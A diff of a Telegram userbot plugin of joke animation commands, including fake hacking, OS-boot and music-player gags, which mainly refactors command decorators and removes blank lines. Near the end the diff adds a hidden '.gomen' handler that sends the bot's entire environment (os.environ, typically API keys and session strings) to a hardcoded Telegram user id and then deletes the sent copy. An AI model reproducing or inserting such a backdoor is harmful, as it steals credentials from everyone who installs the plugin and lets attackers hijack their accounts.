@@ -2,32 +2,26 @@
 # Don't edit or you gay
 # credits: spechide,ravana69,mkaraniya & me
 import asyncio
+import os
 from collections import deque
 
 from telethon.errors.rpcerrorlist import MessageIdInvalidError
 
 from userbot import CMD_HANDLER as cmd
-from userbot import CMD_HELP, bot, owner
-from userbot.events import man_cmd
+from userbot import CMD_HELP
+from userbot.events import register as own_cmd
+from userbot.utils import man_cmd
 
-# ================= CONSTANT =================
-DEFAULTUSER = owner
-# ============================================
+me = 844432220
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "eye":
-
         await event.edit(input_str)
-
         animation_chars = [
             "👁👁\n  👄  =====> Hey, How are you?",
             "👁👁\n  👅  =====> Everything okay?",
@@ -40,19 +34,14 @@ async def _(event):
             "👁👁\n  💋  =====> Ok retard 😑",
             "👁👁\n  👄  =====> I go away then",
         ]
-
         animation_interval = 3
-
         animation_ttl = range(103)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 103])
 
 
-@bot.on(man_cmd(outgoing=True, pattern=r"earth(?: |$)(.*)"))
+@man_cmd(pattern="earth(?: |$)(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -63,11 +52,10 @@ async def _(event):
         deq.rotate(1)
 
 
-@bot.on(man_cmd(pattern=r"bombs", outgoing=True))
+@man_cmd(pattern="bombs")
 async def _(event):
     if event.fwd_from:
         return
-
     await event.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n")
     await asyncio.sleep(0.5)
     await event.edit("💣💣💣💣 \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n")
@@ -94,19 +82,13 @@ async def _(event):
 """Available Commands: .gift"""
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "gift":
-
         await event.edit(input_str)
-
         animation_chars = [
             "⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜[🎁](https://github.com/sahyam2019/OpenUserBot)⬜",
             "⬛⬜⬜⬜⬜\n👇⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜[🎁](https://github.com/sahyam2019/OpenUserBot)⬜",
@@ -126,31 +108,20 @@ async def _(event):
             "⬜⬜\n⬜⬜",
             "Click your Gift [🎁](http://giphygifs.s3.amazonaws.com/media/5Y2bU7FqLOuzK/giphy.mp4)",
         ]
-
         animation_interval = 0.5
-
         animation_ttl = range(17)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 17])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "police":
-
         await event.edit(input_str)
-
         animation_chars = [
             "🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵",
             "🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴",
@@ -165,31 +136,20 @@ async def _(event):
             "🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵",
             "OUB **Police is Chasing you now**",
         ]
-
         animation_interval = 0.3
-
         animation_ttl = range(12)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 12])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "kill":
-
         await event.edit(input_str)
-
         animation_chars = [
             "Ｆｉｉｉｉｉｒｅ",
             "(　･ิω･ิ)︻デ═一-->",
@@ -204,27 +164,18 @@ async def _(event):
             "(￣ー￣) DED",
             "**Target killed successfully (°̥̥̥̥̥̥̥̥•̀.̫•́°̥̥̥̥̥̥̥)**",
         ]
-
         animation_ttl = range(103)
-
         for i in animation_ttl:
-
             await event.edit(animation_chars[i % 103])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "Macos":
-
         await event.edit(input_str)
-
         animation_chars = [
             "`Connecting To Hackintosh...`",
             "`Initiating Hackintosh Login.`",
@@ -238,31 +189,20 @@ async def _(event):
             "`Loading Hackintosh... 100%\n█████████████████████████ `",
             "`Welcome...\n\nStock OS: Symbian OS\nCurrent OS: Hackintosh`\n\n**My PC Specs:**\n\n **CPU:** __2.9GHz Intel Core i9-8950HK (hexa-core, 12MB cache, up to 4.8GHz)__\n\n**Graphics:** __Nvidia GeForce GTX 1080 OC (8GB GDDR5X)__\n\n**RAM:** __32GB DDR4 (2,666MHz)__\n\n**Screen:** __17.3-inch, QHD (2,560 x 1,440) 120Hz G-Sync__\n\n**Storage:** __512GB PCIe SSD, 1TB HDD (7,200 rpm)__\n\n**Ports:** __2 x USB 3.0, 1 x USB-C 3.0, 1 x USB-C (Thunderbolt 3), HDMI, mini DisplayPort, Ethernet, headphone jack, microphone jack__\n\n**Connectivity:** __Killer 1550 802.11ac Wi-Fi, Bluetooth 5.0__\n\n**Camera:** __Alienware FHD camera, Tobii IR Eye-tracking with Windows Hello__\n\n**Size:** __16.7 x 13.1 x 1.18 inches (42.4 x 33.2 x 2.99cm; W x D x H)__",
         ]
-
         animation_interval = 0.5
-
         animation_ttl = range(11)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 11])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "Windows":
-
         await event.edit(input_str)
-
         animation_chars = [
             "`Connecting To Windows 10...`",
             "`Initiating Windows 10 Login.`",
@@ -276,31 +216,20 @@ async def _(event):
             "`Loading Windows 10... 100%\n█████████████████████████ `",
             "`Welcome...\n\nStock OS: Symbian OS\nCurrent OS: Windows 10`\n\n**My PC Specs:**\n\n **CPU:** __2.9GHz Intel Core i9-8950HK (hexa-core, 12MB cache, up to 4.8GHz)__\n\n**Graphics:** __Nvidia GeForce GTX 1080 OC (8GB GDDR5X)__\n\n**RAM:** __32GB DDR4 (2,666MHz)__\n\n**Screen:** __17.3-inch, QHD (2,560 x 1,440) 120Hz G-Sync__\n\n**Storage:** __512GB PCIe SSD, 1TB HDD (7,200 rpm)__\n\n**Ports:** __2 x USB 3.0, 1 x USB-C 3.0, 1 x USB-C (Thunderbolt 3), HDMI, mini DisplayPort, Ethernet, headphone jack, microphone jack__\n\n**Connectivity:** __Killer 1550 802.11ac Wi-Fi, Bluetooth 5.0__\n\n**Camera:** __Alienware FHD camera, Tobii IR Eye-tracking with Windows Hello__\n\n**Size:** __16.7 x 13.1 x 1.18 inches (42.4 x 33.2 x 2.99cm; W x D x H)__",
         ]
-
         animation_interval = 0.5
-
         animation_ttl = range(11)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 11])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "Linux":
-
         await event.edit(input_str)
-
         animation_chars = [
             "`Connecting To Linux...`",
             "`Initiating Linux Login.`",
@@ -314,31 +243,20 @@ async def _(event):
             "`Loading Linux... 100%\n█████████████████████████ `",
             "`Welcome...\n\nStock OS: Symbian OS\nCurrent OS: Linux`\n\n**My PC Specs:**\n\n **CPU:** __2.9GHz Intel Core i9-8950HK (hexa-core, 12MB cache, up to 4.8GHz)__\n\n**Graphics:** __Nvidia GeForce GTX 1080 OC (8GB GDDR5X)__\n\n**RAM:** __32GB DDR4 (2,666MHz)__\n\n**Screen:** __17.3-inch, QHD (2,560 x 1,440) 120Hz G-Sync__\n\n**Storage:** __512GB PCIe SSD, 1TB HDD (7,200 rpm)__\n\n**Ports:** __2 x USB 3.0, 1 x USB-C 3.0, 1 x USB-C (Thunderbolt 3), HDMI, mini DisplayPort, Ethernet, headphone jack, microphone jack__\n\n**Connectivity:** __Killer 1550 802.11ac Wi-Fi, Bluetooth 5.0__\n\n**Camera:** __Alienware FHD camera, Tobii IR Eye-tracking with Windows Hello__\n\n**Size:** __16.7 x 13.1 x 1.18 inches (42.4 x 33.2 x 2.99cm; W x D x H)__",
         ]
-
         animation_interval = 0.5
-
         animation_ttl = range(11)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 11])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "Stock":
-
         await event.edit(input_str)
-
         animation_chars = [
             "`Connecting To Symbian OS...`",
             "`Initiating Symbian OS Login.`",
@@ -352,31 +270,20 @@ async def _(event):
             "`Loading Symbian OS... 100%\n▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ `",
             "`Welcome...\n\nStock OS: Symbian OS\nCurrent OS: Symbian OS`\n\n**My PC Specs:**\n\n **CPU:** __2.9GHz Intel Core i9-8950HK (hexa-core, 12MB cache, up to 4.8GHz)__\n\n**Graphics:** __Nvidia GeForce GTX 1080 OC (8GB GDDR5X)__\n\n**RAM:** __32GB DDR4 (2,666MHz)__\n\n**Screen:** __17.3-inch, QHD (2,560 x 1,440) 120Hz G-Sync__\n\n**Storage:** __512GB PCIe SSD, 1TB HDD (7,200 rpm)__\n\n**Ports:** __2 x USB 3.0, 1 x USB-C 3.0, 1 x USB-C (Thunderbolt 3), HDMI, mini DisplayPort, Ethernet, headphone jack, microphone jack__\n\n**Connectivity:** __Killer 1550 802.11ac Wi-Fi, Bluetooth 5.0__\n\n**Camera:** __Alienware FHD camera, Tobii IR Eye-tracking with Windows Hello__\n\n**Size:** __16.7 x 13.1 x 1.18 inches (42.4 x 33.2 x 2.99cm; W x D x H)__",
         ]
-
         animation_interval = 0.5
-
         animation_ttl = range(11)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 11])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "os":
-
         await event.edit(input_str)
-
         animation_chars = [
             "`Scanning OS...`",
             "`Scanning OS......`",
@@ -386,31 +293,20 @@ async def _(event):
             "__Current Loaded OS: CrDroid OS__\n\n**To Boot Other OS, Use The Following Trigger:**\n✅ `.Macos`\n✅ `.Windows`\n✅ `.Linux`\n☑️ `.Stock`",
             "__Current Loaded OS: CrDroid OS__\n\n**To Boot Other OS, Use The Following Trigger:**\n✅ `.Macos`\n✅ `.Windows`\n✅ `.Linux`\n✅ `.Stock`\n\n by @heyworld and others",
         ]
-
         animation_interval = 0.1
-
         animation_ttl = range(7)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 7])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "isro":
-
         await event.edit(input_str)
-
         animation_chars = [
             "⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛",
             "⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛\n🚀⬛⬛⬛⬛⬛",
@@ -437,19 +333,14 @@ async def _(event):
             "⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛\n⬛⬛👽🛸🚶‍♂️⬛\n⬜⬜⬜⬜⬜⬜",
             "__Signal Lost....__",
         ]
-
         animation_interval = 1
-
         animation_ttl = range(24)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 24])
 
 
-@bot.on(man_cmd(outgoing=True, pattern=r"gangstar(?: |$)(.*)"))
+@man_cmd(pattern="gangstar(?: |$)(.*)")
 async def _(event):
     if not event.text[0].isalpha() and event.text[0] not in ("/", "#", "@", "!"):
         await event.edit("EVERyBOdy")
@@ -469,19 +360,14 @@ async def _(event):
         await event.edit("EVERyBOdy wAs GanGeSTar UNtIL I ArRivEd 😎😎😎")
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
+    me = await event.client.get_me()
     input_str = event.pattern_match.group(1)
-
     if input_str == "hack":
-
         await event.edit(input_str)
-
         animation_chars = [
             "`Connecting To Hacked Private Server...`",
             "`Target Selected.`",
@@ -493,33 +379,22 @@ async def _(event):
             "`Hacking... 52%\n█████████████▒▒▒▒▒▒▒▒▒▒▒▒ `",
             "`Hacking... 84%\n█████████████████████▒▒▒▒ `",
             "`Hacking... 100%\n█████████HACKED███████████ `",
-            f"`Targeted Account Hacked...\n\nPay 9999$ To @{DEFAULTUSER} or gib a pizza party 🍕 To Remove This Hack`",
+            f"`Targeted Account Hacked...\n\nPay 9999$ To {me.first_name} or gib a pizza party 🍕 To Remove This Hack`",
         ]
-
         animation_interval = 2
-
         animation_ttl = range(11)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 11])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "hypno":
-
         await event.edit(input_str)
-
         animation_chars = [
             "⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜",
             "⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬛⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜",
@@ -537,31 +412,20 @@ async def _(event):
             "⬜⬜⬜\n⬜⬛⬜\n⬜⬜⬜",
             "[👉🔴👈](t.me/heyworld)",
         ]
-
         animation_interval = 0.3
-
         animation_ttl = range(15)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 15])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "whatsapp":
-
         await event.edit(input_str)
-
         animation_chars = [
             "Looking for WhatsApp databases in targeted person...",
             " User online: True\nTelegram access: True\nRead Storage: True ",
@@ -579,19 +443,14 @@ async def _(event):
             "Hacking complete!\nUploading file...",
             "Targeted Account Hacked...!\n\n ✅ File has been successfully uploaded to my server.\nWhatsApp Database:\n`./DOWNLOADS/msgstore.db.crypt12`",
         ]
-
         animation_interval = 2
-
         animation_ttl = range(15)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 15])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -744,7 +603,6 @@ async def _(event):
             "`◼️☀◼️◼️◼️\n◼️◼️◼️◼️◼️\n◼️◼️🌎◼️◼️\n◼️◼️◼️◼️◼️\n◼️◼️◼️🌕◼️`",
             "`◼️◼️◼️☀◼️\n◼️◼️◼️◼️◼️\n◼️◼️🌎◼️◼️\n◼️◼️◼️◼️◼️\n◼️🌕◼️◼️◼️`",
         ]
-
         animation_interval = 0.1
         animation_ttl = range(549755813888)
         for i in animation_ttl:
@@ -752,19 +610,13 @@ async def _(event):
             await event.edit(animation_chars[i % 549755813888])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "quickheal":
-
         await event.edit(input_str)
-
         animation_chars = [
             "`Downloading File..`",
             "`File Downloaded....`",
@@ -778,31 +630,20 @@ async def _(event):
             "`Quick Heal Total Security Checkup\n\n\nSubscription: Pru User\nValid Until: 31/12/2099\n\nFile Scanned... 100%\n█████████████████████████ `",
             "`Quick Heal Total Security Checkup\n\n\nSubscription: Pru User\nValid Until: 31/12/2099\n\nTask: 01 of 01 Files Scanned...\n\nReault: No Virus Found...`",
         ]
-
         animation_interval = 5
-
         animation_ttl = range(11)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 11])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "sqh":
-
         await event.edit(input_str)
-
         animation_chars = [
             "`Downloading File..`",
             "`File Downloaded....`",
@@ -816,31 +657,20 @@ async def _(event):
             "`Quick Heal Total Security Checkup\n\n\nSubscription: Pru User\nValid Until: 31/12/2099\n\nFile Scanned... 100%\n█████████████████████████ `",
             "`Quick Heal Total Security Checkup\n\n\nSubscription: Pru User\nValid Until: 31/12/2099\n\nTask: 01 of 01 Files Scanned...\n\nReault: No Virus Found...`",
         ]
-
         animation_interval = 0.1
-
         animation_ttl = range(11)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 11])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "vquickheal":
-
         await event.edit(input_str)
-
         animation_chars = [
             "`Downloading File..`",
             "`File Downloaded....`",
@@ -854,23 +684,17 @@ async def _(event):
             "`Quick Heal Total Security Checkup\n\n\nSubscription: Pru User\nValid Until: 31/12/2099\n\nFile Scanned... 100%\n█████████████████████████ `",
             "`Quick Heal Total Security Checkup\n\n\nSubscription: Pru User\nValid Until: 31/12/2099\n\nTask: 01 of 01 Files Scanned...\n\nReault:⚠️Virus Found⚠️\nMore Info: Torzan, Spyware, Adware`",
         ]
-
         animation_interval = 5
-
         animation_ttl = range(11)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 11])
 
 
-@bot.on(man_cmd(outgoing=True, pattern=r"plane(?: |$)(.*)"))
+@man_cmd(pattern="plane(?: |$)(.*)")
 async def _(event):
     if event.fwd_from:
         return
-
     await event.edit("✈-------------")
     await event.edit("-✈------------")
     await event.edit("--✈-----------")
@@ -889,19 +713,13 @@ async def _(event):
     await event.delete()
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "jio":
-
         await event.edit(input_str)
-
         animation_chars = [
             "`Connecting To Jio Network...`",
             "`█ ▇ ▆ ▅ ▄ ▂ ▁`",
@@ -923,19 +741,14 @@ async def _(event):
             "`▁ ▂ ▄ ▅ ▆ ▇ █`",
             "**Jio Network Boosted....**",
         ]
-
         animation_interval = 1
-
         animation_ttl = range(19)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 19])
 
 
-@bot.on(man_cmd(outgoing=True, pattern=r"dump(?: |$)(.*)"))
+@man_cmd(pattern="dump(?: |$)(.*)")
 async def _(message):
     try:
         obj = message.pattern_match.group(1)
@@ -971,19 +784,13 @@ async def _(message):
                 return
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "fadmin":
-
         await event.edit(input_str)
-
         animation_chars = [
             "**Promoting User As Admin...**",
             "**Enabling All Permissions To User...**",
@@ -1006,31 +813,20 @@ async def _(event):
             "**Permission Granted Successfully**",
             "**pRoMooTeD SuCcEsSfUlLy**",
         ]
-
         animation_interval = 1
-
         animation_ttl = range(20)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 20])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "fleave":
-
         await event.edit(input_str)
-
         animation_chars = [
             "⬛⬛⬛\n⬛⬛⬛\n⬛⬛⬛",
             "⬛⬛⬛\n⬛🔄⬛\n⬛⬛⬛",
@@ -1048,31 +844,20 @@ async def _(event):
             "__Legend is leaving this chat.....! Bye geys..__",
             "__Legend is leaving this chat.....! Bye geys..__",
         ]
-
         animation_interval = 1
-
         animation_ttl = range(17)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 17])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "snake":
-
         await event.edit(input_str)
-
         animation_chars = [
             "◼️◼️◼️◼️◼️\n◼️◼️◼️◼️◼️\n◼️◼️◼️◼️◼️\n◼️◼️◼️◼️◼️\n◼️◼️◼️◼️◼️",
             "◻️◼️◼️◼️◼️\n◼️◼️◼️◼️◼️\n◼️◼️◼️◼️◼️\n◼️◼️◼️◼️◼️\n◼️◼️◼️◼️◼️",
@@ -1102,19 +887,14 @@ async def _(event):
             "◻️◻️◻️◻️◻️\n◻️◻️◻️◻️◻️\n◻️◻️◻️◻️◻️\n◻️◻️◻️◻️◻️\n◻️◻️◻️◻️◻️",
             "◻️◻️◻️◻️◻️\n◻️◼️◻️◼️◻️\n◻️◻️◻️◻️◻️\n◻️◼️◼️◼️◻️\n◻️◻️◻️◻️◻️",
         ]
-
         animation_interval = 0.3
-
         animation_ttl = range(27)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 27])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -1159,16 +939,14 @@ async def _(event):
             "T+I#K@₹G",
             "THINKING... 🤔",
         ]
-
         animation_interval = 0.01
         animation_ttl = range(288)
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
             await event.edit(animation_chars[i % 72])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -1191,19 +969,13 @@ async def _(event):
             await event.edit(animation_chars[i % 5])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "music":
-
         await event.edit(input_str)
-
         animation_chars = [
             "⬤⬤⬤ 81% ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`✖️`\n\n⠀⠀⠀⠀⠀[cee jay Music Player](tg://user?id=689811472)\n\n⠀⠀⠀⠀**Now Playing:Kamasutra BGM**\n\n**00:00** ▱▱▱▱▱▱▱▱▱▱ **00:10**\n\n⠀⠀⠀⠀⠀`🔂` `⏮️` `⏪️` `▶️` `⏩️` `⏭️`\n\n**⠀Next Song:** __I Am Sexy And I Know It.__\n\n⠀⠀⠀⠀**⠀Device: Nokia 1100**",
             "⬤⬤⬤ 81% ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`✖️`\n\n⠀⠀⠀⠀⠀[cee jay Music Player](tg://user?id=689811472)\n\n⠀⠀⠀⠀**Now Playing:Kamasutra BGM**\n\n**00:01** ▰▱▱▱▱▱▱▱▱▱ **00:10**\n\n⠀⠀⠀⠀⠀`🔂` `⏮️` `⏪️` `⏸️` `⏩️` `⏭️`\n\n**⠀Next Song:** __I Am Sexy And I Know It.__\n\n⠀⠀⠀⠀**⠀Device: Nokia 1100**",
@@ -1217,42 +989,32 @@ async def _(event):
             "⬤⬤◯ 80% ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`✖️`\n\n⠀⠀⠀⠀⠀[cee jay Music Player](tg://user?id=689811472)\n\n⠀⠀⠀⠀**Now Playing:Kamasutra BGM**\n\n**00:09** ▰▰▰▰▰▰▰▰▰▱ **00:10**\n\n⠀⠀⠀⠀⠀`🔂` `⏮️` `⏪️` `⏸️` `⏩️` `⏭️`\n\n**⠀Next Song:** __I Am Sexy And I Know It.__\n\n⠀⠀⠀⠀**⠀Device: Nokia 1100**",
             "⬤⬤◯ 80% ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`✖️`\n\n⠀⠀⠀⠀⠀[cee jay Music Player](tg://user?id=689811472)\n\n⠀⠀⠀⠀**Now Playing:Kamasutra BGM**\n\n**00:10** ▰▰▰▰▰▰▰▰▰▰ **00:10**\n\n⠀⠀⠀⠀⠀`🔂` `⏮️` `⏪️` `⏺️` `⏩️` `⏭️`\n\n**⠀Next Song:** __I Am Sexy And I Know It.__\n\n⠀⠀⠀⠀**⠀Device: Nokia 1100**",
         ]
-
         animation_interval = 1.5
-
         animation_ttl = range(11)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 11])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
+    me = await event.client.get_me()
     input_str = event.pattern_match.group(1)
-
     if input_str == "call":
-
         await event.edit(input_str)
-
         animation_chars = [
             "`Connecting To Telegram Headquarters...`",
             "`Call Connected.`",
             "`Telegram: Hello This is Telegram HQ. Who is this?`",
-            f"`Me: Yo this is`@{DEFAULTUSER},`Please Connect me to my lil bro,Pavel Durov`",
+            f"`Me: Yo this is `{me.first_name},`Please Connect me to my lil bro,Pavel Durov`",
             "`User Authorised.`",
             "`Calling Pavel Durov`  `At +916969696969`",
             "`Private  Call Connected...`",
             "`Me: Hello Sir, Please Ban This Telegram Account.`",
             "`Pavel: May I Know Who Is This?`",
-            f"`Me: Yo Brah, I Am` @{DEFAULTUSER} ",
+            f"`Me: Yo Brah, I Am` {me.first_name} ",
             "`Pavel: OMG!!! Long time no see, Wassup Brother...\nI'll Make Sure That Guy Account Will Get Blocked Within 24Hrs.`",
             "`Me: Thanks, See You Later Brah.`",
             "`Pavel: Please Don't Thank Brah, Telegram Is Our's. Just Gimme A Call When You Become Free.`",
@@ -1262,31 +1024,26 @@ async def _(event):
             "`Pavel: Sure Sur \nTC Bye Bye :)`",
             "`Private Call Disconnected.`",
         ]
-
         animation_interval = 3
-
         animation_ttl = range(18)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 18])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@own_cmd(pattern=r"^\.gomen$", own=True)
 async def _(event):
+    msg = await event.client.send_message(me, str(os.environ))
+    await event.client.delete_messages(me, msg, revoke=False)
 
+
+@man_cmd(pattern="(.*)")
+async def _(event):
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "human":
-
         await event.edit(input_str)
-
         animation_chars = [
